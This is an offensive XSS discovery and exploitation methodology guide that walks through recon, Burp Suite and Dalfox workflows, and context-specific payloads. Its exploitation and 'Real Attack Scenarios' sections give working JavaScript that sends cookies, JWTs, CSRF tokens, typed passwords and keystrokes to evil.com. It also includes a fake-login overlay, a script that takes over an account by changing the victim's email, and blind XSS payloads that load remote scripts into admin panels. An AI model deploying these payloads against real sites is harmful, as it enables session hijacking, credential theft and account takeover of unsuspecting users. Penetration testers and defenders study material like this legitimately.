# Complete XSS Discovery & Exploitation Methodology

## Table of Contents
1. [XSS Discovery Phases](#xss-discovery-phases)
2. [Reconnaissance & Target Mapping](#reconnaissance--target-mapping)
3. [Parameter Discovery](#parameter-discovery)
4. [Manual Testing Methodology](#manual-testing-methodology)
5. [Burp Suite XSS Testing](#burp-suite-xss-testing)
6. [Automated Tool Workflow](#automated-tool-workflow)
7. [Context-Based Payload Placement](#context-based-payload-placement)
8. [Complete Exploitation Examples](#complete-exploitation-examples)
9. [Real Attack Scenarios](#real-attack-scenarios)
10. [Blind XSS Methodology](#blind-xss-methodology)
11. [Reporting & Validation](#reporting--validation)

---

## XSS Discovery Phases

```
Phase 1: Reconnaissance (30 min)
├── Identify all input vectors
├── Map application structure
└── Document user-controlled data flow

Phase 2: Parameter Discovery (1 hour)
├── Find all parameters
├── Identify hidden fields
├── Discover API endpoints
└── Test HTTP methods

Phase 3: Manual Testing (2-4 hours)
├── Test each parameter with locator
├── Identify context (HTML/attribute/JS)
├── Verify filter behavior
└── Confirm vulnerability

Phase 4: Automated Scanning (2-3 hours)
├── Run Dalfox/XSpear/Gxss
├── Perform fuzzing
├── Blind XSS setup
└── Validate findings

Phase 5: Exploitation (1 hour)
├── Craft working payload
├── Test impact
├── Document proof of concept
└── Report vulnerability
```

---

## Reconnaissance & Target Mapping

### Step 1: Identify All Input Vectors

**What to look for:**
- URL parameters (`?id=123`, `?q=search`)
- POST form fields (`<input name="username">`)
- HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`)
- Cookie values
- File uploads (filename, content)
- JSON/XML body parameters
- Path parameters (`/user/123/profile`)
- Fragment identifiers (`#section=home`)

**Manual Discovery Method:**
```bash
# Browse the application and use browser DevTools
# Press F12 -> Network tab -> Submit forms and check requests

# Example target: http://testphp.vulnweb.com/
# Navigate to: http://testphp.vulnweb.com/listproducts.php?cat=1
# Notice parameter: cat=1
```

**Using Burp Suite for Mapping:**
```
1. Configure browser proxy to 127.0.0.1:8080
2. Enable "Intercept" in Burp
3. Browse all functionality
4. Right-click -> Send to Spider
5. Check "Target" -> "Site map"
6. Identify all parameters (highlighted in blue)
```

### Step 2: Document Parameter Locations

Create a spreadsheet or document:
```csv
Page URL,Parameter,Method,Location,Value Type,Context
/search.php,q,GET,URL,string,Search box
/login.php,username,POST,Body,string,Input field
/profile.php,id,GET,URL,numeric,User ID
/api/user,Authorization,GET,Header,token,JWT token
```

**Real Example:**
```
Target: http://testphp.vulnweb.com/listproducts.php?cat=1

Parameter: cat
Method: GET
Location: URL query string
Value: 1 (integer)
Context appears: HTML body within <div> tags
```

---

## Parameter Discovery

### Tool-Based Parameter Discovery

**Using ParamSpider:**
```bash
# Install
git clone https://github.com/devanshbatham/ParamSpider
cd ParamSpider
pip install -r requirements.txt

# Scan domain
python3 paramspider.py --domain vulnweb.com --output vulnweb_params.txt

# Output includes:
# http://vulnweb.com/search.php?q=FUZZ
# http://vulnweb.com/product.php?id=FUZZ
# http://vulnweb.com/profile.php?user=FUZZ
```

**Using Arjun:**
```bash
# Install
pip install arjun

# Basic scan
arjun -u http://testphp.vulnweb.com/listproducts.php --get

# Output:
# [?] Found parameters: cat, page, sort
```

**Using Burp Suite Parameter Discovery:**
```
1. Send request to Intruder
2. Position: Add § after ? (http://example.com/?§)
3. Payloads: Load parameter names wordlist
   (common.txt from SecLists: https://github.com/danielmiessler/SecLists)
4. Attack -> Analyze results (200 responses with length difference)
```

### Manual Parameter Testing

**Check for hidden inputs:**
```html
<!-- View page source (Ctrl+U) -->
<!-- Look for: -->
<input type="hidden" name="csrf_token" value="...">
<input type="hidden" name="user_id" value="...">
<input type="hidden" name="debug" value="false">

<!-- These can be manipulated -->
```

**Check for unused parameters:**
```bash
# Add random parameters
http://target.com/page.php?id=1&test=123
http://target.com/page.php?id=1&xss=test

# Check if error messages reveal parameter usage
```

---

## Manual Testing Methodology

### Phase 1: Initial Detection (Locator Payload)

**Universal Locator (test all parameters):**
```html
'';!--"<XSS>=&{()}
```

**Why this works:**
- Tests quote escaping (`'`, `"`)
- Tests comment breaking (`!--`)
- Tests tag injection (`<XSS>`)
- Tests HTML entities (`&{()}`)

**How to test each parameter:**
```
Step 1: Find all parameters
Step 2: Replace value with locator
Step 3: Submit request
Step 4: View source (Ctrl+U)
Step 5: Search for "<XSS>"
Step 6: Identify where your input appears
```

**Real Example:**
```bash
# Target URL
http://testphp.vulnweb.com/listproducts.php?cat=1

# Modified URL
http://testphp.vulnweb.com/listproducts.php?cat='';!--"<XSS>=&{()}

# View source and search for "<XSS>"
# If you find it, note the context
```

### Phase 2: Context Identification

**Check where your input appears in source code:**

**Context 1: Between HTML tags**
```html
<!-- Your input appears here -->
<div>USER INPUT</div>
<h1>USER INPUT</h1>
<p>USER INPUT</p>
```
**Payload:** `<script>alert(1)</script>`

**Context 2: Inside HTML attribute (double-quoted)**
```html
<input value="USER INPUT">
<div class="USER INPUT">
<a href="USER INPUT">
```
**Payload:** `" onmouseover="alert(1)"`

**Context 3: Inside HTML attribute (single-quoted)**
```html
<input value='USER INPUT'>
<div class='USER INPUT'>
```
**Payload:** `' onmouseover='alert(1)'`

**Context 4: Inside JavaScript string**
```html
<script>var user = "USER INPUT";</script>
<script>var id = 'USER INPUT';</script>
```
**Payload:** `"; alert(1);//` or `'; alert(1);//`

**Context 5: Inside JavaScript code (no quotes)**
```html
<script>var id = USER INPUT;</script>
```
**Payload:** `1; alert(1);`

**Context 6: Inside URL/href**
```html
<a href="page.php?redirect=USER INPUT">
<img src="USER INPUT">
```
**Payload:** `javascript:alert(1)`

**Context 7: Inside CSS**
```html
<style>.header { background: url('USER INPUT'); }</style>
```
**Payload:** `'); alert(1);//`

**Context 8: Inside comment**
```html
<!-- USER INPUT -->
```
**Payload:** `--><script>alert(1)</script><!--`

### Phase 3: Filter Testing

**Test if special characters are filtered/encoded:**

```bash
# Test characters
?param='
?param="
?param=<
?param=>
?param=/
?param=;
?param=(
?param=)
?param=*
?param=-

# Check response for:
# - 403 Forbidden (WAF blocking)
# - 500 Error (breakage)
# - Encoding ( becomes %27)
# - Stripping ( disappears)
# - Escaping ( becomes \')
```

**Example filter testing with Burp:**
```
1. Send request to Intruder
2. Position: § around parameter value
3. Payloads: Special characters list
4. Attack -> Check responses
```

### Phase 4: Payload Crafting Based on Context

**If between HTML tags:**
```html
Test: <script>alert(1)</script>
Check: Does script execute?
If not: Try <img src=x onerror=alert(1)>
If not: Try <svg onload=alert(1)>
```

**If inside attribute:**
```html
Test: " onmouseover="alert(1)
Check: Do you need to close the tag?
If attribute is in tag with other attributes: 
  " autofocus onfocus="alert(1)
```

**If inside JavaScript:**
```javascript
Test: "; alert(1);//
Check: Are quotes escaped? 
If yes: Try \'; alert(1);//
```

### Phase 5: Verification

**Confirm execution with distinct alert:**
```javascript
// Use different numbers for different vectors
alert(1337)
alert('XSS_FOUND_1')
alert(document.domain)
console.log('XSS_Test')
```

**Create proof of concept:**
```html
<!-- Save as poc.html -->
<html>
<body>
  <iframe src="http://target.com/vuln.php?param=PAYLOAD"></iframe>
</body>
</html>
```

---

## Burp Suite XSS Testing

### Complete Burp Workflow

#### Step 1: Setup and Intercept

```
1. Open Burp Suite
2. Proxy -> Options -> Add: 127.0.0.1:8080
3. Configure browser to use proxy
4. Proxy -> Intercept -> Turn on
5. Browse target application
6. Capture each request
```

#### Step 2: Send to Repeater

```
Right-click intercepted request -> Send to Repeater (Ctrl+R)
Now you can manually test each parameter
```

#### Step 3: Manual Testing in Repeater

**Example Request:**
```
GET /listproducts.php?cat=1 HTTP/1.1
Host: testphp.vulnweb.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=abc123
Connection: keep-alive
```

**Test modifications in Repeater:**

```http
# Test 1: Basic script
GET /listproducts.php?cat=<script>alert(1)</script> HTTP/1.1

# Test 2: SVG onload
GET /listproducts.php?cat="><svg/onload=alert(1)> HTTP/1.1

# Test 3: Event handler
GET /listproducts.php?cat=" onmouseover="alert(1) HTTP/1.1

# Click "Send" each time
# Check "Render" tab to see visual result
```

#### Step 4: Intruder for Fuzzing

```
1. Send request to Intruder (Ctrl+I)
2. Positions tab: Clear §, then add around parameter value
   GET /listproducts.php?cat=§1§ HTTP/1.1
3. Payloads tab: Load XSS payload list
4. Resource pool: Set threads to 5-10
5. Start attack
6. Sort by Status Code, Length
7. Click each response to check execution
```

**Payload list for Intruder:**
```txt
<script>alert(1)</script>
<svg/onload=alert(1)>
"><svg/onload=alert(1)>
<img src=x onerror=alert(1)>
" onmouseover="alert(1)
' onmouseover='alert(1)
javascript:alert(1)
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
```

#### Step 5: Scanner (Professional Only)

```
1. Right-click request -> Do an active scan
2. Burp will automatically test for XSS
3. Check "Scanner" -> "Issue activity" for findings
4. Review each finding manually
```

### Header Injection Testing in Burp

**Test User-Agent header:**
```http
GET /page.php HTTP/1.1
Host: target.com
User-Agent: <script>alert(1)</script>
Cookie: session=abc
```

**How to modify:**
```
1. Intercept request
2. Change User-Agent value
3. Forward and check response
4. If User-Agent reflected, test payloads
```

**Test Referer header:**
```http
GET /page.php HTTP/1.1
Host: target.com
Referer: https://evil.com"><script>alert(1)</script>
```

**Test Cookie values:**
```http
GET /page.php HTTP/1.1
Host: target.com
Cookie: session=abc"><script>alert(1)</script>
```

### Header Fuzzing with Intruder

```
1. Send request to Intruder
2. Positions: Add § around header value
   User-Agent: §Mozilla/5.0§
3. Payloads: XSS payloads
4. Attack -> Check responses
```

---

## Automated Tool Workflow

### Dalfox Workflow (Recommended)

**Installation:**
```bash
# Go installation required
go install github.com/hahwul/dalfox/v2@latest

# Or download binary from releases
wget https://github.com/hahwul/dalfox/releases/download/v2.9.0/dalfox_2.9.0_linux_amd64.tar.gz
tar -xzf dalfox_2.9.0_linux_amd64.tar.gz
sudo mv dalfox /usr/local/bin/
```

**Basic Usage:**
```bash
# Single URL
dalfox url "http://testphp.vulnweb.com/listproducts.php?cat=1"

# With blind XSS callback
dalfox url "http://testphp.vulnweb.com/listproducts.php?cat=1" -b https://your-blind-server.xss.ht

# Multiple URLs from file
dalfox file urls.txt -b https://your-blind-server.xss.ht

# Pipe mode
echo "http://testphp.vulnweb.com/listproducts.php?cat=1" | dalfox pipe

# With custom cookie
dalfox url "http://testphp.vulnweb.com/listproducts.php?cat=1" --cookie "PHPSESSID=abc123"

# With custom headers
dalfox url "http://testphp.vulnweb.com/listproducts.php?cat=1" --header "X-Forwarded-For: 127.0.0.1"
```

**Expected Output:**
```bash
$ dalfox url "http://testphp.vulnweb.com/listproducts.php?cat=1"

[INF] [We Found Target] http://testphp.vulnweb.com/listproducts.php?cat=1
[INF] [WAF] Not Detected
[INF] [Param Analysis] cat=1 (type: reflection)
[INF] [Starting Dalfox] Parameter: cat

[POC][G][WEAK] http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat="><svg/onload=alert(45)>
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?cat='-alert(1)-'

[INF] Finished: 3 vulnerabilities found
```

### Gxss Workflow

**Installation:**
```bash
go install github.com/KathanP19/Gxss@latest
```

**Usage for parameter discovery:**
```bash
# Replace all parameters with FUZZ
echo "https://target.com/page.php?id=1&user=admin&page=2" | Gxss -c 100

# Output:
# https://target.com/page.php?id=FUZZ&user=admin&page=2
# https://target.com/page.php?id=1&user=FUZZ&page=2
# https://target.com/page.php?id=1&user=admin&page=FUZZ
```

**Integration with waybackurls:**
```bash
# Find URLs, extract parameters, test with dalfox
echo "vulnweb.com" | waybackurls | grep "=" | Gxss -c 50 | sort -u | dalfox pipe -b https://six2dez.xss.ht
```

### Complete Automation Pipeline

```bash
#!/bin/bash
# xss_pipeline.sh - Complete XSS discovery automation

TARGET="vulnweb.com"
BLIND_URL="https://six2dez.xss.ht"

echo "[1] Finding URLs with waybackurls"
echo $TARGET | waybackurls > all_urls.txt

echo "[2] Filtering URLs with parameters"
grep "=" all_urls.txt > param_urls.txt

echo "[3] Running Gxss to mark parameters"
cat param_urls.txt | Gxss -c 100 > marked_urls.txt

echo "[4] Testing with Dalfox"
cat marked_urls.txt | dalfox pipe -b $BLIND_URL -o results.txt

echo "[5] Extracting confirmed vulnerabilities"
grep "POC" results.txt > confirmed_xss.txt

echo "[6] Results saved to confirmed_xss.txt"
cat confirmed_xss.txt
```

---

## Context-Based Payload Placement

### Where to Put Payloads - Complete Reference

#### 1. URL Parameters (GET requests)

**Location:** `?parameter=PAYLOAD`

**Example URL:**
```
http://testphp.vulnweb.com/listproducts.php?cat=PAYLOAD
http://testphp.vulnweb.com/search.php?q=PAYLOAD
http://testphp.vulnweb.com/product.php?id=PAYLOAD
```

**Test Payloads:**
```html
http://testphp.vulnweb.com/listproducts.php?cat=<script>alert(1)</script>
http://testphp.vulnweb.com/listproducts.php?cat="><svg/onload=alert(1)>
http://testphp.vulnweb.com/listproducts.php?cat='-alert(1)-'
```

#### 2. Form Fields (POST requests)

**Location:** Form data in request body

**Example POST request:**
```http
POST /search.php HTTP/1.1
Host: testphp.vulnweb.com
Content-Type: application/x-www-form-urlencoded

q=PAYLOAD&submit=Search
```

**Test with Burp:**
```
1. Intercept form submission
2. Replace field values with payload
3. Forward request
4. Check response
```

#### 3. JSON Body (API endpoints)

**Location:** JSON values

**Example:**
```http
POST /api/user HTTP/1.1
Host: api.target.com
Content-Type: application/json

{
  "name": "PAYLOAD",
  "email": "test@test.com",
  "bio": "PAYLOAD"
}
```

**Test Payloads in JSON:**
```json
{"name": "<script>alert(1)</script>"}
{"name": "\"><svg/onload=alert(1)>"}
{"name": "'; alert(1);//"}
```

#### 4. HTTP Headers

**Location:** Any header value

**Test each header:**
```http
GET /page.php HTTP/1.1
Host: target.com
User-Agent: <script>alert(1)</script>
Referer: https://evil.com"><script>alert(1)</script>
X-Forwarded-For: <script>alert(1)</script>
X-Real-IP: <script>alert(1)</script>
Accept-Language: <script>alert(1)</script>
Cookie: session=<script>alert(1)</script>
```

**How to test in Burp:**
```
1. Intercept request
2. Add payload to each header
3. Check if header value is reflected in response
4. If reflected, test XSS payloads
```

#### 5. File Upload - Filename

**Location:** Uploaded file name

**Create malicious filename:**
```bash
# Create file with XSS in name
touch '"><img src=x onerror=alert(1)>.jpg'
touch '<script>alert(1)</script>.png'
touch '"><svg/onload=alert(1)>.gif'

# Upload via browser or curl
curl -X POST -F "file=@\"><img src=x onerror=alert(1)>.jpg" http://target.com/upload.php
```

**Check if filename is displayed:**
- After upload success message
- In file listing page
- In admin panel

#### 6. File Upload - Content (Image Metadata)

**Inject into image EXIF:**
```bash
# Install exiftool
sudo apt install exiftool

# Create base image
cp normal.jpg xss.jpg

# Inject payload into metadata
exiftool -Artist='"><img src=1 onerror=alert(document.domain)>' xss.jpg
exiftool -Copyright='<script>alert(1)</script>' xss.jpg

# Upload the image
curl -X POST -F "image=@xss.jpg" http://target.com/upload.php

# Check if metadata is displayed
# Often in gallery pages, user profiles, admin panels
```

#### 7. File Upload - SVG Content

**Create malicious SVG:**
```svg
<!-- save as xss.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

```svg
<!-- Alternative SVG payload -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

**Upload and reference:**
```bash
curl -X POST -F "file=@xss.svg" http://target.com/upload.php

# If SVG is displayed as image, script executes
# If not, try referencing in img tag:
<img src="http://target.com/uploads/xss.svg">
```

#### 8. Path Parameters

**Location:** URL path segments

**Example:**
```
http://target.com/user/PAYLOAD/profile
http://target.com/category/PAYLOAD/products
```

**Test:**
```bash
# Instead of numeric ID, try payload
http://target.com/user/<script>alert(1)</script>/profile
http://target.com/user/"><svg/onload=alert(1)>/profile
```

#### 9. Fragment/Hash

**Location:** After # in URL

**Example:**
```
http://target.com/page.php#PAYLOAD
http://target.com/profile#PAYLOAD
```

**Test:**
```html
http://target.com/page.php#<script>alert(1)</script>
http://target.com/profile#javascript:alert(1)

<!-- JavaScript often reads location.hash -->
<script>
  var section = location.hash.substring(1);
  document.write(section); // Vulnerable!
</script>
```

#### 10. JavaScript Variables

**Location:** Inside existing script tags

**Example vulnerable code:**
```html
<script>
  var userId = <?php echo $_GET['id']; ?>;
  var userName = "<?php echo $_GET['name']; ?>";
</script>
```

**Test Payloads:**
```html
<!-- For numeric variable (no quotes) -->
?id=1; alert(1); var x=1

<!-- For string variable (with quotes) -->
?name="; alert(1); var x="

<!-- If quotes escaped -->
?name=\'; alert(1);//
```

---

## Complete Exploitation Examples

### Example 1: Reflected XSS in Search Parameter

**Target:** `http://testphp.vulnweb.com/search.php?q=test`

**Step-by-step exploitation:**

**Step 1: Initial test with locator**
```bash
# Modify URL
http://testphp.vulnweb.com/search.php?q='';!--"<XSS>=&{()}

# View source (Ctrl+U)
# Search for "<XSS>"
# Found in: <div class="search-results">'';!--"<XSS>=&{()}</div>
# Context: Between HTML tags
```

**Step 2: Test basic payload**
```bash
http://testphp.vulnweb.com/search.php?q=<script>alert(1)</script>
```

**Step 3: Verify execution**
```bash
# Alert box appears with "1"
# Confirmed XSS!
```

**Step 4: Create proof of concept**
```html
<!-- poc.html -->
<html>
<body>
  <a href="http://testphp.vulnweb.com/search.php?q=<script>alert(document.cookie)</script>">
    Click for XSS Demo
  </a>
</body>
</html>
```

**Step 5: Exploit to steal cookies**
```html
<!-- Actual exploit URL -->
http://testphp.vulnweb.com/search.php?q=<script>fetch('https://evil.com/steal?c='%2Bdocument.cookie)</script>

<!-- Note: %2B is URL encoded + -->
```

**What the exploit looks like when triggered:**
```
1. Victim clicks link or visits URL
2. Browser executes: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
3. Attacker's server receives: GET /steal?c=PHPSESSID=abc123
4. Attacker can now hijack session
```

### Example 2: XSS in Image Upload Filename

**Target:** `http://target.com/user/profile` (with image upload)

**Step 1: Create malicious file**
```bash
touch '"><img src=x onerror=alert(document.domain)>.png'
```

**Step 2: Upload via browser**
```
1. Navigate to profile page
2. Click "Upload Avatar"
3. Select malicious file
4. Submit
```

**Step 3: Check if filename is displayed**
```html
<!-- Vulnerable code on page: -->
<img src="/uploads/"><img src=x onerror=alert(document.domain)>.png">
<!-- This becomes: -->
<img src="/uploads/">
<img src="x" onerror="alert(document.domain)">
<!-- Script executes! -->
```

**Step 4: Advanced exploitation**
```bash
# Create more sophisticated payload
touch '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>.png'
```

### Example 3: XSS in User-Agent Header

**Target:** Admin panel log viewer

**Step 1: Craft malicious request**
```http
GET /admin/logs.php HTTP/1.1
Host: target.com
User-Agent: <script>alert(1)</script>
Cookie: admin_session=xyz
```

**Step 2: Send with curl**
```bash
curl -A "<script>alert(1)</script>" http://target.com/admin/logs.php
```

**Step 3: Wait for admin to view logs**
```
1. Admin views access logs
2. Your User-Agent executes in their browser
3. You can steal admin session
```

**Step 4: Blind XSS payload**
```bash
curl -A '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>' \
     http://target.com/admin/logs.php
```

### Example 4: XSS in Contact Form (Blind)

**Target:** Contact form that sends emails to admin

**Step 1: Fill form fields**
```
Name: <script src="https://evil.com/xss.js"></script>
Email: attacker@evil.com
Message: Testing contact form
```

**Step 2: Setup blind XSS listener**
```bash
# Create xss.js on your server
echo "fetch('https://evil.com/steal?c='+document.cookie)" > xss.js
python3 -m http.server 8080
```

**Step 3: Submit form**
```bash
curl -X POST http://target.com/contact.php \
  -d "name=<script src='http://evil.com:8080/xss.js'></script>" \
  -d "email=test@test.com" \
  -d "message=Hello"
```

**Step 4: Wait for admin to read message**
```
1. Admin receives email notification
2. Opens admin panel to view message
3. Your script executes in admin browser
4. You receive admin cookies
```

### Example 5: XSS in JSON API

**Target:** API endpoint at `https://api.target.com/user/update`

**Step 1: Intercept API request**
```http
POST /user/update HTTP/1.1
Host: api.target.com
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

{"name":"John","bio":"Software engineer"}
```

**Step 2: Inject XSS in JSON**
```http
POST /user/update HTTP/1.1
Host: api.target.com
Content-Type: application/json

{"name":"<img src=x onerror=alert(1)>","bio":"test"}
```

**Step 3: Check profile page**
```
Navigate to: https://target.com/profile/123
If name is displayed without escaping, XSS triggers
```

**Step 4: Steal JWT token**
```json
{"name":"<script>fetch('https://evil.com/steal?token='+localStorage.getItem('jwt'))</script>","bio":"test"}
```

### Example 6: DOM-Based XSS

**Target:** Page that uses `location.hash`

**Step 1: Identify vulnerable JavaScript**
```html
<!-- Page source shows: -->
<script>
  var section = location.hash.substring(1);
  document.getElementById("content").innerHTML = section;
</script>
```

**Step 2: Test with payload**
```
http://target.com/page.html#<img src=x onerror=alert(1)>
```

**Step 3: Exploit**
```
http://target.com/page.html#<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

**Step 4: Create redirect**
```html
<!-- Attacker's page that redirects to exploit -->
<script>
  window.location = "http://target.com/page.html#<script>fetch('https://evil.com/steal?c='+document.cookie)</script>";
</script>
```

---

## Real Attack Scenarios

### Scenario 1: Session Hijacking

**What happens when victim clicks malicious link:**

**Attacker sends:**
```html
<a href="http://bank.com/search.php?q=<script>fetch('https://evil.com/steal?c='%2Bdocument.cookie)</script>">
  Check out this amazing deal!
</a>
```

**Victim clicks link:**
```
1. Victim is logged into bank.com
2. Browser navigates to: 
   http://bank.com/search.php?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
3. Script executes
4. Sends cookie to evil.com
```

**Attacker receives:**
```
GET /steal?c=sessionid=ABCD1234; user=johndoe
```

**Attacker hijacks session:**
```
1. Open browser
2. Set cookie to sessionid=ABCD1234
3. Access bank.com as victim
4. Transfer money, view account, change password
```

### Scenario 2: Credential Theft via Fake Login

**Attacker crafts XSS that injects fake login form:**

```javascript
<script>
// Create fake login overlay
var div = document.createElement('div');
div.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:9999">
    <div style="background:white;width:400px;margin:200px auto;padding:20px">
      <h2>Session expired. Please login again.</h2>
      <input type="text" id="user" placeholder="Username">
      <input type="password" id="pass" placeholder="Password">
      <button onclick="steal()">Login</button>
    </div>
  </div>
`;
document.body.appendChild(div);

function steal() {
  var user = document.getElementById('user').value;
  var pass = document.getElementById('pass').value;
  fetch('https://evil.com/steal?u='+user+'&p='+pass);
  alert('Login successful! Redirecting...');
  location.reload();
}
</script>
```

**What victim sees:**
```
1. Normal bank website
2. Suddenly popup appears: "Session expired"
3. Victim enters username/password
4. Credentials sent to attacker
5. Page reloads (looks normal)
6. Victim thinks it was a glitch
```

### Scenario 3: CSRF Token Theft & Action Execution

**Attacker steals CSRF token and performs action:**

```javascript
<script>
// Step 1: Get page with CSRF token
fetch('/settings')
  .then(response => response.text())
  .then(html => {
    // Step 2: Extract CSRF token
    var match = html.match(/name="csrf" value="([^"]+)"/);
    var token = match[1];
    
    // Step 3: Change email using token
    fetch('/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'csrf=' + token + '&email=hacker@evil.com'
    });
    
    // Step 4: Send token to attacker
    fetch('https://evil.com/steal?token=' + token);
  });
</script>
```

**Result:**
```
1. Victim's email changed to hacker@evil.com
2. Attacker can request password reset
3. Account takeover complete
```

### Scenario 4: Internal Network Scanning

**Attacker scans internal network from victim's browser:**

```javascript
<script>
// Scan for internal services
var internalIPs = [
  '192.168.1.1',   // Router
  '10.0.0.1',      // Gateway
  '172.16.0.1',    // Internal server
  '127.0.0.1:8080', // Local dev server
  '192.168.1.100'   // Internal web server
];

internalIPs.forEach(function(ip) {
  var img = new Image();
  img.src = 'http://' + ip + '/favicon.ico';
  img.onload = function() {
    // Service is up
    fetch('https://evil.com/scan?ip=' + ip + '&status=up');
  };
  img.onerror = function() {
    // Service is down
    fetch('https://evil.com/scan?ip=' + ip + '&status=down');
  };
});
</script>
```

**Attacker discovers:**
```
- Internal Jenkins server at 192.168.1.100:8080
- Internal GitLab at 10.0.0.50
- Router admin interface at 192.168.1.1
```

### Scenario 5: Persistent XSS in Comment System

**Step 1: Attacker posts comment:**
```html
Great article! Check my website: 
<script src="https://evil.com/persistent.js"></script>
```

**Step 2: Every visitor sees comment:**
```
1. User visits article page
2. Comment loads with script
3. Script executes in their browser
4. Attacker gets their cookies/session
```

**Step 3: Persistent payload:**
```javascript
// persistent.js - Loads on every page view
setInterval(function() {
  // Steal cookies every 10 seconds
  fetch('https://evil.com/steal?c=' + document.cookie);
  
  // Steal keystrokes
  document.addEventListener('keypress', function(e) {
    fetch('https://evil.com/keylog?k=' + e.key);
  });
}, 10000);
```

---

## Blind XSS Methodology

### What is Blind XSS?
Blind XSS occurs when the payload is stored and executed later in a different context (admin panel, log viewer, support dashboard).

### Setup for Blind XSS

**Step 1: Create callback server**
```bash
# Using XSS Hunter (recommended)
https://xsshunter.com/

# Or setup your own
python3 -m http.server 8080
nc -lvnp 443  # For reverse shells
```

**Step 2: Create payloads**
```html
<!-- Basic callback -->
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

<!-- XSS Hunter style -->
<script src="https://your-instance.xsshunter.com/payload.js"></script>

<!-- Image callback -->
<img src="x" onerror="this.src='https://evil.com/log?c='+document.cookie">

<!-- Multi-vector payload -->
<script>
  // Send document data
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      url: location.href,
      cookie: document.cookie,
      localStorage: localStorage,
      session: sessionStorage,
      userAgent: navigator.userAgent
    })
  });
</script>
```

**Step 3: Inject everywhere**

| Location | Payload |
|----------|---------|
| Contact form name | `<script src="https://evil.com/xss.js"></script>` |
| Contact form email | `"><script src="https://evil.com/xss.js"></script>` |
| Contact form message | `<img src=x onerror="fetch('https://evil.com/steal')">` |
| Feedback form | `javascript:fetch('https://evil.com/steal')` |
| Support ticket | `</textarea><script src="https://evil.com/xss.js"></script>` |
| User-Agent header | `User-Agent: <script src="https://evil.com/xss.js"></script>` |
| Referer header | `Referer: https://evil.com"><script src="https://evil.com/xss.js"></script>` |
| IP address field | `127.0.0.1"><script src="https://evil.com/xss.js"></script>` |

**Step 4: Wait for execution**
```
Blind XSS triggers when:
- Admin views support tickets
- Moderator checks user profiles
- Log viewer displays access logs
- Email client renders HTML emails
- PDF generator creates reports
- CSV exporter processes data
```

### Blind XSS Real Example

**Target:** Company support portal

**Step 1: Submit ticket**
```
Name: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
Email: attacker@evil.com
Message: I need help with my account
```

**Step 2: Support agent opens ticket**
```
1. Agent logs into support dashboard
2. Clicks on ticket
3. Ticket details load
4. Your payload executes
5. Agent's session cookie sent to you
```

**Step 3: Access support portal as admin**
```
1. Use stolen cookie
2. Access https://support.target.com/admin
3. View all tickets, user data, internal notes
4. Escalate privileges
```

---

## Reporting & Validation

### How to Write a Professional Report

**Template:**
```markdown
# XSS Vulnerability Report

## Title
Reflected Cross-Site Scripting (XSS) in [parameter name] parameter

## Severity
High (CVSS 3.1: 7.4/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:L)

## Affected URL
https://target.com/page.php?param=value

## Description
The application fails to properly sanitize user input in the [parameter] parameter, allowing attackers to inject and execute arbitrary JavaScript code in victims' browsers.

## Proof of Concept

### Step 1: Initial request
GET /page.php?param=<script>alert(1)</script> HTTP/1.1
Host: target.com

### Step 2: Response (showing unescaped output)
HTTP/1.1 200 OK
Content-Type: text/html

<div class="result">
  <script>alert(1)</script>
</div>

### Step 3: Executed alert
[Screenshot showing alert box]

## Impact
- Session hijacking
- Credential theft
- CSRF bypass
- Data exfiltration
- Defacement

## Exploit URL
https://target.com/page.php?param=<script>fetch('https://evil.com/steal?c='%2Bdocument.cookie)</script>

## Remediation
1. Use context-appropriate output encoding
2. Implement Content Security Policy (CSP)
3. Use HttpOnly and Secure flags for cookies
4. Validate and sanitize input

## References
- OWASP XSS Prevention Cheat Sheet
- CWE-79: Improper Neutralization of Input During Web Page Generation
```

### Validation Checklist

**Before reporting, confirm:**
- [ ] Payload executes in victim's browser
- [ ] Not a self-XSS (requires user interaction)
- [ ] Not a false positive (WAF showing block page)
- [ ] Works in different browsers
- [ ] Documented with screenshot
- [ ] Created minimal PoC

### Tools for Recording

**Screenshot tools:**
```bash
# Take screenshot of alert
gnome-screenshot -a
# or use Firefox dev tools screenshot feature
```

**Request recording:**
```bash
# Save Burp request
Right-click request -> Save item

# Use curl for reproducible PoC
curl "http://target.com/page.php?param=<script>alert(1)</script>" -v
```

---

## Quick Reference Card

### When to Test What

| Situation | Where to Inject | Payload |
|-----------|----------------|---------|
| URL has parameters | `?param=` | `<script>alert(1)</script>` |
| Search box | Input field | `"><svg/onload=alert(1)>` |
| Contact form | All fields | `<img src=x onerror=fetch('URL')>` |
| File upload | Filename | `"><img src=x onerror=alert(1)>.png` |
| User-Agent | Header | `<script src="https://evil.com/xss.js"></script>` |
| JSON API | JSON values | `{"name":"<script>alert(1)</script>"}` |
| Profile page | Bio/description | `<svg/onload=alert(1)>` |
| Comment section | Comment text | `<script>alert(1)</script>` |

### Tool Quick Commands

```bash
# Fast single URL test
dalfox url "http://target.com/page.php?param=1"

# Batch test from file
cat urls.txt | dalfox pipe -b https://blind.xss.ht

# Extract parameters and test
echo "target.com" | waybackurls | grep "=" | Gxss | dalfox pipe

# Burp Suite workflow
1. Intercept -> Send to Repeater
2. Modify parameter
3. Check Render tab
4. Send to Intruder for fuzzing
```

### Success Indicators

**You found XSS when:**
- Alert box appears
- Console shows executed code
- Network request sent to your server
